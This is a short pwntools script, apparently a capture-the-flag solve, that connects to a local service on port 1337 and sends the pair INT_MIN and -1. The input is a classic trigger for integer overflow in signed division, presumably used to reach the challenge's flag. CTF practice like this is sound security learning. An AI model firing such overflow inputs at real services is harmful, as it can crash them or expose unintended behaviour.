from pwn import *

conn = remote('0.0.0.0', 1337)
conn.sendline(b'-2147483648 -1')
print(conn.recvline().decode())
print(conn.recvline().decode())
